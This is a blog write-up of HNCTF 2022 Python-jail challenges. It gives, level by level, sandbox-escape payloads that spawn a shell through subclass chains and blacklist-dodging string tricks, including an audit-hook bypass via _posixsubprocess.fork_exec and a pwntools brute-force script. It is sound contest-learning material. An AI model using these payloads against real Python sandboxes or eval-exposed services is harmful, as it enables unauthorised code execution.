<!doctypehtml><html lang=en><meta charset=UTF-8><meta content=width=device-width,initial-scale=1,maximum-scale=2 name=viewport><meta content=#222 name=theme-color><meta content=IE=edge,chrome=1 http-equiv=X-UA-COMPATIBLE><meta content=webkit name=renderer><link href=/assets/favicon.ico rel=icon sizes=32x32 type=image/ico><link href=/assets/apple-touch-icon.png rel=apple-touch-icon sizes=180x180><link href=/rss.xml rel=alternate title=rev@天枢 type=application/rss+xml><link href=/atom.xml rel=alternate title=rev@天枢 type=application/atom+xml><link href=https://demoyao100.github.io/feed.json rel=alternate title=rev@天枢 type=application/json><link href=https://lf9-cdn-tos.bytecdntp.com rel=preconnect><link href=https://cdn.jsdelivr.net rel=dns-prefetch><link href=https://unpkg.com rel=dns-prefetch><link href=https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext rel=stylesheet><link href=/css/app.css?v=0.3.15 rel=stylesheet><meta content=jail name=keywords><link href=https://demoyao100.github.io/2022/11/01/pythonJail/ rel=canonical><title>pythonJail</title><meta content="Hexo 7.0.0" name=generator><body itemscope itemtype=http://schema.org/WebPage><div id=loading><div class=cat><div class=body></div><div class=head><div class=face></div></div><div class=foot><div class=tummy-end></div><div class=bottom></div><div class="legs left"></div><div class="legs right"></div></div><div class=paw><div class="hands left"></div><div class="hands right"></div></div></div></div><div id=container><header id=header itemscope itemtype=http://schema.org/WPHeader><div class=inner><div id=brand><div class=pjax><h1 itemprop="name headline">pythonJail</h1><div class=meta><span title="Created: 2022-11-01 15:48:11" class=item><span class=icon><i class="ic i-calendar"></i></span><span class=text>Posted on</span><time itemprop="dateCreated datePublished" datetime=2022-11-01T15:48:11+08:00>2022-11-01</time></span><span title="Symbols count in article" class=item><span class=icon><i class="ic i-pen"></i></span><span class=text>Symbols count in article</span><span>12k</span><span class=text>words</span></span><span title="Reading time" class=item><span class=icon><i class="ic i-clock"></i></span><span class=text>Reading time</span><span>11 mins.</span></span></div></div></div><nav id=nav><div class=inner><div class=toggle><div aria-label="Toggle navigation bar" class=lines><span class=line></span><span class=line></span><span class=line></span></div></div><ul class=menu><li class="item title"><a href=/ rel=start>Moyao の小屋</a></ul><ul class=right id=rightNav><li class="item theme" @click=changeThemeByBtn><i :class="{'i-sun': !themeStatus,'i-moon': themeStatus}" class=ic></i><li class="item search"><i class="ic i-search"></i></ul></div></nav></div><div class=pjax id=imgs><img src=https://tva4.sinaimg.cn/mw690/6833939bly1gicis3attqj20zk0m8k7l.jpg></div></header><div id=waves><svg viewbox="0 24 150 28" class=waves preserveaspectratio=none shape-rendering=auto xmlns=http://www.w3.org/2000/svg xmlns:xlink=http://www.w3.org/1999/xlink><defs><path d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" id=gentle-wave></path></defs><g class=parallax><use x=48 xlink:href=#gentle-wave y=0></use><use x=48 xlink:href=#gentle-wave y=3></use><use x=48 xlink:href=#gentle-wave y=5></use><use x=48 xlink:href=#gentle-wave y=7></use></g></svg></div><main><div class=inner><div class=pjax id=main><div class="article wrap"><div class=breadcrumb itemlistelement itemscope itemtype=https://schema.org/BreadcrumbList><i class="ic i-home"></i><span><a href=/>Home</a></span></div><article class="post block" itemscope itemtype=http://schema.org/Article lang=en><link href=https://demoyao100.github.io/2022/11/01/pythonJail/ itemprop=mainEntityOfPage><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta content=/assets/avatar.jpg itemprop=image><meta content=Moyao itemprop=name><meta content="Hi,I'm Moyaoxue, Write down something interesting I met<br />
Feel free to mail me if you have something wanted to talk about, plz
mail: &amplt;moyaoxue@outlook.com&ampgt;
" itemprop=description></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta content=rev@天枢 itemprop=name></span><div class="body md" itemprop=articleBody><h4 id=preface><a class=anchor href=#preface>#</a> preface</h4><h6 id=thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail><a class=anchor href=#thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail>#</a> Thanks to 空白 crazyman, who brough us so much excellent ctf exercises. (Though I didn't work out many of them that is.) Now the HNCTF has ended, I found some write up about the python jail problems<a href=https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/ rel=noopener target=_blank>pythonJail</a>.</h6><p><span id=more></span><h3 id=level-1><a class=anchor href=#level-1>#</a> LEVEL 1</h3><p><img alt=level1 data-src=pythonJail/level1.png loading=lazy><p>From the function filter, we sees that the symbol [" ' ` i b] is banned. Which means (Show subclasses with tuple) <code> ().\__class\__.\__base\__.\__subclasses\__()</code><p>is not allowed. What's more, symbol ' and " is banned, so it come to us that we may can use <code>chr</code> to splicing a string that we wanted.<p>Two possible payload:<blockquote><p>getattr(getattr(getattr(getattr(()._<em>class_</em>,c),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))<br> (().__class__.__base__.__subclasses__()[-4].__init__.__globals__<a href="'sh'">'system'</a>)</blockquote><blockquote><p>open(chr(102)+chr(108)+chr(97)+chr(103)).read()<br> from <a href=https://zhuanlan.zhihu.com/p/578986988 rel=noopener target=_blank>thisBlog</a></blockquote><p><img alt=level1pos data-src=pythonJail/level1wp.png loading=lazy><h3 id=level-2><a class=anchor href=#level-2>#</a> LEVEL 2</h3><p><img alt=level1 data-src=pythonJail/level2.png loading=lazy><p>The length of the payload is limited to 13.<p>The answer according to 空白 is the function &LTc style="color: #FF0000">"breakpoint ()"&LT/c>, which I didn't figure out yet. However, there is another way. Use <code>eval(input())</code> so that the program receive once again for your input! Seems a little bit like <code>/?cmd=system($_POST[1]);$1=ls</code> to escape the filter in php right?<h3 id=level-3><a class=anchor href=#level-3>#</a> LEVEL 3</h3><p><img alt=level3 data-src=pythonJail/level3.png loading=lazy><p>This time, the maximum length of our payload is down to 7.<p>I didn't quite understand yet, but function <code>help()</code> can help you passby the 7 words limit. Here is when I tried others' payload, quite amazing and when I am available I shall come back to study it.<blockquote></blockquote><p><img alt=level3 data-src=pythonJail/level3wp.png loading=lazy><h3 id=python2-input-jail><a class=anchor href=#python2-input-jail>#</a> PYTHON2 INPUT JAIL</h3><p><img alt=input(jail) data-src=pythonJail/input(jail).png loading=lazy><p>python2, another thing I am not familiar with...<p>Looking up others' write up...<p><img alt=input(jail) data-src=pythonJail/input(jail)wp.png loading=lazy><h3 id=level-25><a class=anchor href=#level-25>#</a> LEVEL 2.5</h3><p><img alt=level2.5 data-src=pythonJail/level2.5.png loading=lazy><p>We can use <code>breakpoint()</code> to go into pdb, and rce is possible.<h3 id=lake><a class=anchor href=#lake>#</a> LAKE</h3><p><img alt=lake data-src=pythonJail/lake.png loading=lazy><h6 id=strange-christencrazyman-seems-to-name-it-lake-from-leak><a class=anchor href=#strange-christencrazyman-seems-to-name-it-lake-from-leak>#</a> Strange christen.(Crazyman seems to name it 'lake' from 'leak'?)</h6><p>Use <code>globals()</code> to leak the key. And then get shell.<h3 id=lke><a class=anchor href=#lke>#</a> L@KE</h3><p><img alt=l@ke data-src=pythonJail/l%40ke.png loading=lazy><h6 id=another-strange-christen><a class=anchor href=#another-strange-christen>#</a> Another strange christen...</h6><p>The maxinum length of payload is now 6, so only <code>help()</code> is possible.<p>But unlike cases above, this time module 'os' is destory or whatever. Now we comes to the base reason why we use 'os' above. <code>help()</code> can actually get you into any module in the python file, which includes <code>__main__</code> ! And surely, the key can be found inside.<p>&LTbr><h5 id=ok-now-weve-go-through-the-first-four-level-designed-by-crazyman-that-is-from-level-5-there-provides-no-source-code><a class=anchor href=#ok-now-weve-go-through-the-first-four-level-designed-by-crazyman-that-is-from-level-5-there-provides-no-source-code>#</a> OK, now we've go through the first four level( designed by crazyman, that is). From level 5, there provides no source code.</h5><p>&LTbr><h3 id=level-5><a class=anchor href=#level-5>#</a> LEVEL 5</h3><p><img alt=level5 data-src=pythonJail/level5.png loading=lazy><p>Just rce can give you the flag.(unexpected) Later we will see how it shall really be work out.<h3 id=level-4><a class=anchor href=#level-4>#</a> LEVEL 4</h3><h6 id=why-is-it-4-after-5-i-dont-know><a class=anchor href=#why-is-it-4-after-5-i-dont-know>#</a> (Why is it 4 after 5 I don't know...)</h6><p>4 bytes rce, seems impossible, so lets just guass it use <code>os.system(input_data)</code> to get your input and bingo.<p><img alt=level4 data-src=pythonJail/level4.png loading=lazy><h3 id=lake-2><a class=anchor href=#lake-2>#</a> LAkE</h3><p><img alt=laKe data-src=pythonJail/laKelaKe.png loading=lazy><p>This time it imports <code>sys</code> module with <a href=https://peps.python.org/pep-0578/ rel=noopener target=_blank>audit hook</a>, and direct RCE function like <code>pty.spawn、os.system、os.exec、os.posix_spawn、os.spawn、subprocess.Popen</code> is not available. Whats more, <code>compile、eval、exec、open</code> is unfetchable. However, there use <code>random.setstate()</code> to generate its random number, which is base on Mersenne <a href=https://zh.wikipedia.org/zh-tw/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95 rel=noopener target=_blank>Twister</a>, and is crackable. In general, if we got the state of the random number generator, we can generate the same number. That leads two problems: There is only one 'eval' in the server code, but we need to execute more. How to restore the state BEFORE the random number is generated?<p>First, we need to know a thing named Assignment Expresions in python, or rather, walrus operator. Then, we package those formula in a list. They will be calculate from left to right. As for function, we can replace it with <code>lambda</code> . Some case can be view below:<pre><code>https://ctftime.org/writeup/21982

https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#operators-and-short-tricks
</code></pre><p>Second, if we <code>import random</code> and print <code>random.getstate</code> at the beginning, we got a tuple back. which may look like: <code>(3, (..., 624), None)</code> . The first value '3' and the last value 'None' is fixed. Only 624 numbers in the middle is changed. So if we assign the conter zero, we get the random number.<h5 id=payload><a class=anchor href=#payload>#</a> payload:</h5><pre><code>[random:=\_\_import__('random'), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1]
</code></pre><h3 id=level-51><a class=anchor href=#level-51>#</a> LEVEL 5.1</h3><p>Dued to the unexpected solves in level5, crazyman gives another problem, stating level5.1.<p><code>nc</code> and <code>dir()</code> (as it tells you to), found <code>my_flag</code> , try <code>list(getattr(my_flag,'flag))</code> , got a <code>AttributeError: 'flag_level5' object has no attribute 'flag'</code> . So payload is <code>list(getattr(my_flag,'flag_level5'))</code><p>Another way to solve this problem(though quite similar, the latter gets its shell)<p><img alt=level5.1_1 data-src=pythonJail/level5.1_1.png loading=lazy><br> <img alt=level5.1_2 data-src=pythonJail/level5.1_2.png loading=lazy><h3 id=lak3><a class=anchor href=#lak3>#</a> LAK3</h3><p><img alt=lak3 data-src=pythonJail/lak3.png loading=lazy><p>Same as before, we can use the excate same payload. Though the official payload provides by crazyman is <code>__import__('sys')._getframe(1).f_locals['right_guesser_question_answer']</code><h5 id=a-good-blog-can-refer><a class=anchor href=#a-good-blog-can-refer>#</a> <a href=https://ctftime.org/writeup/21982 rel=noopener target=_blank>a good blog can refer</a></h5><h3 id=type-chnnel><a class=anchor href=#type-chnnel>#</a> tyPe Ch@nnEl</h3><p><img alt=sideChannel data-src=pythonJail/sideChannel.png loading=lazy><p>I haven't quite understand yet. So I will put the payload beforehand:<p>One possible:<pre><code>from pwn import *
from tqdm import trange

class Gao:
    def __init__(self):
        self.known = ''

def init(self):
    # self.conn = process(['python3', './server_type.py'])
    self.conn = remote('1.14.71.254', 28563)

def gao(self):
    payload = '((1)if(type(flag.split())(flag.encode()).pop({pos})^{val})else(True))'
    i = len(self.known)
    while True:
        for j in trange(32, 128):
            cur_payload = payload.format(pos=i, val=j)
            self.init()
            self.conn.sendlineafter('Payload:', cur_payload)
            s = self.conn.recvline()
            self.conn.close()
            if (b'Try' in s):
                return
            elif (b'bool' in s):
                self.known += chr(j)
                print(self.known)
                print(self.known)
                print(self.known)
                break
        else:
            raise Exception('GG simida')            
        i += 1
if __name__ == '__main__':
    g = Gao()
    g.gao()
</code></pre><p>↑ Can took some time(when I tried)<p>Officail:<pre><code>for i in range(len(flag), len(flag)+100): # flag length
for guess in chars: # all possible chars
    print("guess: ", bytes(flag), chr(guess))
    payload = f"type(type(flag).mro())(type(type(flag).mro())(flag).pop({i}).encode()).remove({guess})"
</code></pre><h3 id=level-4-2><a class=anchor href=#level-4-2>#</a> LEVEL 4</h3><h6 id=level-4-again><a class=anchor href=#level-4-again>#</a> level 4 again</h6><p><img alt=level4_1 data-src=pythonJail/level4_1.png loading=lazy><p>Quite similar as before, just use <code>bytes().decode()</code> to pass the black list.<p><img alt=level4_1wp1 data-src=pythonJail/level4wp1.png loading=lazy><br> <img alt=level4_1wp2 data-src=pythonJail/level4wp2.png loading=lazy><p>payload:<pre><code>().__class__.__base__.__subclasses__()
</code></pre><h5><a class=anchor href=#>#</a></h5><p>​ ().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[-4].<strong>init</strong>.<strong>globals</strong>[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())<p>There is another solution to this problem: I am not sure I fully understand it, so I put a <a href=https://zhuanlan.zhihu.com/p/579057932 rel=noopener target=_blank>link</a> here beforehand.<h5 id=payload-2><a class=anchor href=#payload-2>#</a> payload:</h5><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])
</code></pre><p><img alt=level4wp3 data-src=pythonJail/level4wp_3.png loading=lazy><h3 id=level-405><a class=anchor href=#level-405>#</a> LEVEL 4.0.5</h3><p>Same payload as last one.<p><img alt=level4.0.5 data-src=pythonJail/level4.0.5.png loading=lazy><h3 id=level-41><a class=anchor href=#level-41>#</a> LEVEL 4.1</h3><p>Quite same as before.<p><img alt=level4.1 data-src=pythonJail/level4.1wp1.png loading=lazy><p>Ps, the <code>bytes</code> is now banned, but still you can use <code>show subclassed with tuples</code> to replace, like this:<pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
</code></pre><h3 id=level-42><a class=anchor href=#level-42>#</a> LEVEL 4.2</h3><p>Quite same as before..<p><img alt=level4.2 data-src=pythonJail/level4.2wp.png loading=lazy><h5 id=or-rather-use-join><a class=anchor href=#or-rather-use-join>#</a> Or rather use <code>join</code> :</h5><figure class="highlight python"><figcaption data-lang=python></figcaption><table><tr><td data-num=1><td><pre><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">86</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></table></figure><h3 id=level-43><a class=anchor href=#level-43>#</a> LEVEL 4.3</h3><p>Quite same as before...<p><img alt=level4.3 data-src=pythonJail/level4.3wp.png loading=lazy><p>&LTbr><h5 id=the-next-few-levels-are-become-harder-and-harder><a class=anchor href=#the-next-few-levels-are-become-harder-and-harder>#</a> The next few levels are become harder and harder.</h5><p>&LTbr><h3 id=level-6><a class=anchor href=#level-6>#</a> LEVEL 6</h3><h4 id=repetition><a class=anchor href=#repetition>#</a> repetition:</h4><p><img alt=level6wp1 data-src=pythonJail/level6wp1.png loading=lazy><br> <img alt=level6wp2 data-src=pythonJail/level6wp2.png loading=lazy><br> <img alt=level6wp3 data-src=pythonJail/level6wp3.png loading=lazy><h5 id=link-that-may-help-you><a class=anchor href=#link-that-may-help-you>#</a> <a href=https://ctftime.org/writeup/31883 rel=noopener target=_blank>link that may help you</a></h5><p>The basic idea is to RCE with <code>_posixsubprocess.fork_exec</code> . If we import it directly, it will trigger the audit hook. But we can pass it by using <code>__builtins__['__loader__'].load_module('_posixsubprocess')</code> or <code>__loader__.load_module('_posixsubprocess')</code> . Also, due to its repeatedly exct, we just shell like this:<pre><code>import os
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
</code></pre><h3 id=level-61><a class=anchor href=#level-61>#</a> LEVEL 6.1</h3><p>This time, we only got one time to excute our payload. Though, we our learning above, we know that walrus operator can help us. Also, the shell will shut immediately, the blogger think of a interesting way to overcome this, by brute force, getting shell over and over again and try to input command. That works.<p><img alt=level6.1wp data-src=pythonJail/level6.1wp.png loading=lazy><h5 id=payload-3><a class=anchor href=#payload-3>#</a> payload:</h5><pre><code>[os := __import__('os'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), [_posixsubprocess.fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in range(100000)]]
</code></pre><h5 id=or><a class=anchor href=#or>#</a> or</h5><pre><code>[os := __import__('os'), itertools := __loader__.load_module('itertools'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), [_posixsubprocess.fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]
</code></pre><h3 id=safeeval><a class=anchor href=#safeeval>#</a> SAFEEVAL</h3><p>Use lambda to wrap up RCE<p>payload:<pre><code>(lambda: __import__('os').system('sh'))()
</code></pre><p><img alt=safeeval data-src=pythonJail/safeeval_1.png loading=lazy><br> <img alt=safeeval data-src=pythonJail/safeeval_2.png loading=lazy><h3 id=level7><a class=anchor href=#level7>#</a> LEVEL7</h3><h6 id=come-back-later-to-try-to-figure-it-out><a class=anchor href=#come-back-later-to-try-to-figure-it-out>#</a> Come back later to try to figure it out...</h6><p>payload:<blockquote><p>@exec<br> @input<br> class X: pass</blockquote><blockquote><p><strong>import</strong>('os').system('sh')</blockquote><h5 id=blog><a class=anchor href=#blog>#</a> <a href=https://gynvael.coldwind.pl/n/python_sandbox_escape rel=noopener target=_blank>blog</a></h5><pre><code>↑# [organizers] Robin_Jadoul solution↑
</code></pre><p><img alt=level7 data-src=pythonJail/level7wp1.png loading=lazy><br> <img alt=level7 data-src=pythonJail/level7wp2.png loading=lazy><h3 id=ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail><a class=anchor href=#ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail>#</a> Ok, so that's the end of the hnctf. There are some thing that may help you get further about pyjail:</h3><pre><code>https://gynvael.coldwind.pl/n/python_sandbox_escape

https://www.youtube.com/watch?v=Ub_BMOMDOx0

https://zhuanlan.zhihu.com/p/578966149
</code></pre><div class=tags><a href=/tags/jail/ rel=tag><i class="ic i-tag"></i>jail</a></div></div><footer><div class=meta><span class=item><span class=icon><i class="ic i-calendar-check"></i></span><span class=text>Edited on</span><time title="Modified: 2024-05-05 09:56:19" datetime=2024-05-05T09:56:19+08:00 itemprop=dateModified>2024-05-05</time></span></div><div class=reward><button><i class="ic i-heartbeat"></i>Donate</button><p>Give me a cup of [coffee]~(￣▽￣)~*<div id=qr><div><img alt="Moyao WeChat Pay" data-src=/assets/wechatpay.png loading=lazy><p>WeChat Pay</div><div><img alt="Moyao Alipay" data-src=/assets/alipay.png loading=lazy><p>Alipay</div></div></div><div id=copyright><ul><li class=author><strong>Post author: </strong>Moyao<i class="ic i-at"><em>@</em></i>rev@天枢<li class=link><strong>Post link: </strong><a href=https://demoyao100.github.io/2022/11/01/pythonJail/ title=pythonJail>https://demoyao100.github.io/2022/11/01/pythonJail/</a><li class=license><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh rel=noopener target=_blank><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> unless stating additionally.</ul></div></footer></article></div><div class=post-nav><div class="item left"><a title="Changes of Python API in IDA" data-background-image=https://tva4.sinaimg.cn/mw690/6833939bly1giciszlczyj20zk0m816d.jpg href=/2022/09/25/Changes-of-Python-API-in-IDA/ itemprop=url rel=prev><span class=type>Previous Post</span><h3>Changes of Python API in IDA</h3></a></div><div class="item right"><a data-background-image=https://tva4.sinaimg.cn/mw690/6833939bly1giciszlczyj20zk0m816d.jpg href=/2022/11/02/hnctfRe/ itemprop=url rel=next title=hnctfRe><span class=type>Next Post</span><h3>hnctfRe</h3></a></div></div></div><div id=sidebar><div class=inner><div class=panels><div class=inner><div class="contents panel pjax" data-title=Contents><ol class=toc><li class="toc-item toc-level-4"><a class=toc-link href=#preface><span class=toc-number>1.</span> <span class=toc-text> preface</span></a><ol class=toc-child><li class="toc-item toc-level-6"><a class=toc-link href=#thanks-to-%E7%A9%BA%E7%99%BDcrazyman-who-brough-us-so-much-excellent-ctf-exercises-though-i-didnt-work-out-many-of-them-that-is-now-the-hnctf-has-ended-i-found-some-write-up-about-the-python-jail-problemspythonjail><span class=toc-number>1.0.1.</span> <span class=toc-text> Thanks to 空白 crazyman, who brough us so much excellent ctf exercises. (Though I didn't work out many of them that is.) Now the HNCTF has ended, I found some write up about the python jail problemspythonJail.</span></a></ol></ol><li class="toc-item toc-level-3"><a class=toc-link href=#level-1><span class=toc-number></span> <span class=toc-text> LEVEL 1</span></a><li class="toc-item toc-level-3"><a class=toc-link href=#level-2><span class=toc-number></span> <span class=toc-text> LEVEL 2</span></a><li class="toc-item toc-level-3"><a class=toc-link href=#level-3><span class=toc-number></span> <span class=toc-text> LEVEL 3</span></a><li class="toc-item toc-level-3"><a class=toc-link href=#python2-input-jail><span class=toc-number></span> <span class=toc-text> PYTHON2 INPUT JAIL</span></a><li class="toc-item toc-level-3"><a class=toc-link href=#level-25><span class=toc-number></span> <span class=toc-text> LEVEL 2.5</span></a><li class="toc-item toc-level-3"><a class=toc-link href=#lake><span class=toc-number></span> <span class=toc-text> LAKE</span></a><ol class=toc-child><li class="toc-item toc-level-6"><a class=toc-link href=#strange-christencrazyman-seems-to-name-it-lake-from-leak><span class=toc-number>0.0.1.</span> <span class=toc-text> Strange christen.(Crazyman seems to name it 'lake' from 'leak'?)</span></a></ol><li class="toc-item toc-level-3"><a class=toc-link href=#lke><span class=toc-number></span> <span class=toc-text> L@KE</span></a><ol class=toc-child><li class="toc-item toc-level-6"><a class=toc-link href=#another-strange-christen><span class=toc-number>0.0.1.</span> <span class=toc-text> Another strange christen...</span></a></ol><li class="toc-item toc-level-5"><a class=toc-link href=#ok-now-weve-go-through-the-first-four-level-designed-by-crazyman-that-is-from-level-5-there-provides-no-source-code><span class=toc-number>0.1.</span> <span class=toc-text> OK, now we've go through the first four level( designed by crazyman, that is). From level 5, there provides no source code.</span></a><li class="toc-item toc-level-3"><a class=toc-link href=#level-5><span class=toc-number></span> <span class=toc-text> LEVEL 5</span></a><li class="toc-item toc-level-3"><a class=toc-link href=#level-4><span class=toc-number></span> <span class=toc-text> LEVEL 4</span></a><ol class=toc-child><li class="toc-item toc-level-6"><a class=toc-link href=#why-is-it-4-after-5-i-dont-know><span class=toc-number>0.0.1.</span> <span class=toc-text> (Why is it 4 after 5 I don't know...)</span></a></ol><li class="toc-item toc-level-3"><a class=toc-link href=#lake-2><span class=toc-number></span> <span class=toc-text> LAkE</span></a><ol class=toc-child><li class="toc-item toc-level-5"><a class=toc-link href=#payload><span class=toc-number>0.1.</span> <span class=toc-text> payload:</span></a></ol><li class="toc-item toc-level-3"><a class=toc-link href=#level-51><span class=toc-number></span> <span class=toc-text> LEVEL 5.1</span></a><li class="toc-item toc-level-3"><a class=toc-link href=#lak3><span class=toc-number></span> <span class=toc-text> LAK3</span></a><ol class=toc-child><li class="toc-item toc-level-5"><a class=toc-link href=#a-good-blog-can-refer><span class=toc-number>0.1.</span> <span class=toc-text> a good blog can refer</span></a></ol><li class="toc-item toc-level-3"><a class=toc-link href=#type-chnnel><span class=toc-number></span> <span class=toc-text> tyPe Ch@nnEl</span></a><li class="toc-item toc-level-3"><a class=toc-link href=#level-4-2><span class=toc-number></span> <span class=toc-text> LEVEL 4</span></a><ol class=toc-child><li class="toc-item toc-level-6"><a class=toc-link href=#level-4-again><span class=toc-number>0.0.1.</span> <span class=toc-text> level 4 again</span></a></ol><li class="toc-item toc-level-5"><a class=toc-link><span class=toc-number>0.1.</span> <span class=toc-text> </span></a><li class="toc-item toc-level-5"><a class=toc-link href=#payload-2><span class=toc-number>0.2.</span> <span class=toc-text> payload:</span></a><li class="toc-item toc-level-3"><a class=toc-link href=#level-405><span class=toc-number></span> <span class=toc-text> LEVEL 4.0.5</span></a><li class="toc-item toc-level-3"><a class=toc-link href=#level-41><span class=toc-number></span> <span class=toc-text> LEVEL 4.1</span></a><li class="toc-item toc-level-3"><a class=toc-link href=#level-42><span class=toc-number></span> <span class=toc-text> LEVEL 4.2</span></a><ol class=toc-child><li class="toc-item toc-level-5"><a class=toc-link href=#or-rather-use-join><span class=toc-number>0.1.</span> <span class=toc-text> Or rather use join :</span></a></ol><li class="toc-item toc-level-3"><a class=toc-link href=#level-43><span class=toc-number></span> <span class=toc-text> LEVEL 4.3</span></a><ol class=toc-child><li class="toc-item toc-level-5"><a class=toc-link href=#the-next-few-levels-are-become-harder-and-harder><span class=toc-number>0.1.</span> <span class=toc-text> The next few levels are become harder and harder.</span></a></ol><li class="toc-item toc-level-3"><a class=toc-link href=#level-6><span class=toc-number></span> <span class=toc-text> LEVEL 6</span></a><ol class=toc-child><li class="toc-item toc-level-4"><a class=toc-link href=#repetition><span class=toc-number>1.</span> <span class=toc-text> repetition:</span></a><ol class=toc-child><li class="toc-item toc-level-5"><a class=toc-link href=#link-that-may-help-you><span class=toc-number>1.1.</span> <span class=toc-text> link that may help you</span></a></ol></ol><li class="toc-item toc-level-3"><a class=toc-link href=#level-61><span class=toc-number></span> <span class=toc-text> LEVEL 6.1</span></a><ol class=toc-child><li class="toc-item toc-level-5"><a class=toc-link href=#payload-3><span class=toc-number>0.1.</span> <span class=toc-text> payload:</span></a><li class="toc-item toc-level-5"><a class=toc-link href=#or><span class=toc-number>0.2.</span> <span class=toc-text> or</span></a></ol><li class="toc-item toc-level-3"><a class=toc-link href=#safeeval><span class=toc-number></span> <span class=toc-text> SAFEEVAL</span></a><li class="toc-item toc-level-3"><a class=toc-link href=#level7><span class=toc-number></span> <span class=toc-text> LEVEL7</span></a><ol class=toc-child><li class="toc-item toc-level-6"><a class=toc-link href=#come-back-later-to-try-to-figure-it-out><span class=toc-number>0.0.1.</span> <span class=toc-text> Come back later to try to figure it out...</span></a></ol><li class="toc-item toc-level-5"><a class=toc-link href=#blog><span class=toc-number>0.1.</span> <span class=toc-text> blog</span></a><li class="toc-item 